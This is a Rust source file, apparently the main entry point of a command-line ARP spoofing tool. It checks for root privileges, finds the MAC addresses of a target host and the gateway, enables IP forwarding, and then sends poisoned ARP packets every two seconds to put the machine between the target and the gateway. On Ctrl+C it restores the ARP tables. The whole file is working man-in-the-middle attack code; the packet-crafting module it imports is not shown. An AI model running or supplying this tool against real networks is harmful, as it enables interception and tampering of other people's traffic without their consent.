use anyhow::Result;
use clap::Parser;
mod cli;
// use pcap::Device;
use std::io::{self, Write};
use std::net::IpAddr;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;
mod arp;
use arp::ArpSpoofer;

fn main() -> Result<()> {
    if !check_sudo() {
        println!("This program must be run with sudo/root privileges.");
        std::process::exit(1);
    }

    let cli = cli::Cli::parse();
    let (interface, target_ip, gateway_ip) = (cli.interface, cli.target, cli.gateway);

    let target_ip: IpAddr = target_ip.parse()?;
    let gateway_ip: IpAddr = gateway_ip.parse()?;

    let network_interface = match get_network_interface(&interface) {
        Some(iface) => iface,
        None => {
            println!("Network interface '{}' not found.", interface);
            std::process::exit(1);
        }
    };
    // dbg!(&network_interface);

    // let pcap_device = match Device::list()?
    //     .into_iter()
    //     .find(|d| d.name == network_interface.name)
    // {
    //     Some(dev) => dev,
    //     None => {
    //         println!(
    //             "PCAP device for interface '{}' not found.",
    //             network_interface.name
    //         );
    //         std::process::exit(1);
    //     }
    // };
    // dbg!(&pcap_device);

    let self_ip = network_interface.ips.iter().find_map(|ip_network| {
        if let IpAddr::V4(ipv4) = ip_network.ip() {
            Some(ipv4)
        } else {
            None
        }
    });
    let self_mac = network_interface.mac.unwrap();

    let mut arp_spoofer = ArpSpoofer {
        target_ip,
        gateway_ip,
        target_mac: [0; 6],
        gateway_mac: [0; 6],
        self_ip: self_ip.unwrap(),
        self_mac: self_mac.octets(),
        interface: network_interface,
    };

    println!("[*] Discovering target MAC address...");
    let target_mac = arp_spoofer.find_target_mac();
    arp_spoofer.target_mac = target_mac;
    println!(
        "[+] Target MAC: {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
        target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]
    );

    println!("[*] Discovering gateway MAC address...");
    let gateway_mac = arp_spoofer.find_gateway_mac();
    arp_spoofer.gateway_mac = gateway_mac;
    println!(
        "[+] Gateway MAC: {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
        gateway_mac[0],
        gateway_mac[1],
        gateway_mac[2],
        gateway_mac[3],
        gateway_mac[4],
        gateway_mac[5]
    );

    // IP forwarding
    println!("[*] Enabling IP forwarding...");
    if let Err(e) = enable_ip_forwarding() {
        eprintln!("[!] Warning: Failed to enable IP forwarding: {}", e);
        eprintln!("[!] Traffic may be dropped instead of forwarded.");
    } else {
        println!("[+] IP forwarding enabled");
    }

    // Ctrl+C handler
    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();
    let spoofer_clone = arp_spoofer.clone();

    ctrlc::set_handler(move || {
        println!("\n[*] Caught Ctrl+C, restoring ARP tables...");
        r.store(false, Ordering::SeqCst);

        spoofer_clone.restore_arp_tables();

        println!("[*] Disabling IP forwarding...");
        if let Err(e) = disable_ip_forwarding() {
            eprintln!("[!] Warning: Failed to disable IP forwarding: {}", e);
        }

        println!("[+] ARP tables restored. Exiting...");
        std::process::exit(0);
    })
    .expect("Error setting Ctrl-C handler");

    println!("[*] Starting ARP spoofing (Press Ctrl+C to stop)...");
    println!("[*] Target: {} <-> Gateway: {}", target_ip, gateway_ip);
    println!();
    io::stdout().flush().unwrap();

    let mut packet_count = 0;
    while running.load(Ordering::SeqCst) {
        arp_spoofer.send_poisoned_req();
        packet_count += 2;
        println!("[*] Sent {} ARP spoofing packets (total)", packet_count);
        io::stdout().flush().unwrap();

        thread::sleep(Duration::from_secs(2));
    }

    Ok(())
}

fn get_network_interface(iface: &str) -> Option<pnet_datalink::NetworkInterface> {
    let interfaces = pnet_datalink::interfaces();
    for interface in interfaces {
        if interface.name == iface {
            return Some(interface);
        }
    }
    None
}

// trait GetDetails {
//     fn ip_addr(&self) -> Option<Ipv4Addr>;
// }
//
// impl GetDetails for pcap::Device {
//     fn ip_addr(&self) -> Option<Ipv4Addr> {
//         self.addresses
//             .iter()
//             .filter_map(|i| match i.addr {
//                 IpAddr::V4(ipv4) => Some(ipv4),
//                 _ => None,
//             })
//             .next_back()
//     }
// }

fn check_sudo() -> bool {
    use is_sudo::RunningAs;
    let is_sudo = is_sudo::check();

    match is_sudo {
        RunningAs::Root => true,
        RunningAs::User => false,
    }
}

#[cfg(target_os = "macos")]
fn enable_ip_forwarding() -> Result<()> {
    use std::process::Command;

    let output = Command::new("sysctl")
        .args(["-w", "net.inet.ip.forwarding=1"])
        .output()?;

    if !output.status.success() {
        anyhow::bail!("Failed to enable IP forwarding");
    }
    Ok(())
}

#[cfg(target_os = "linux")]
fn enable_ip_forwarding() -> Result<()> {
    use std::fs;
    fs::write("/proc/sys/net/ipv4/ip_forward", "1")?;
    Ok(())
}

#[cfg(not(any(target_os = "macos", target_os = "linux")))]
fn enable_ip_forwarding() -> Result<()> {
    eprintln!("IP forwarding control not implemented for this OS");
    Ok(())
}

#[cfg(target_os = "macos")]
fn disable_ip_forwarding() -> Result<()> {
    use std::process::Command;

    let output = Command::new("sysctl")
        .args(["-w", "net.inet.ip.forwarding=0"])
        .output()?;

    if !output.status.success() {
        anyhow::bail!("Failed to disable IP forwarding");
    }
    Ok(())
}

#[cfg(target_os = "linux")]
fn disable_ip_forwarding() -> Result<()> {
    use std::fs;
    fs::write("/proc/sys/net/ipv4/ip_forward", "0")?;
    Ok(())
}

#[cfg(not(any(target_os = "macos", target_os = "linux")))]
fn disable_ip_forwarding() -> Result<()> {
    eprintln!("IP forwarding control not implemented for this OS");
    Ok(())
}
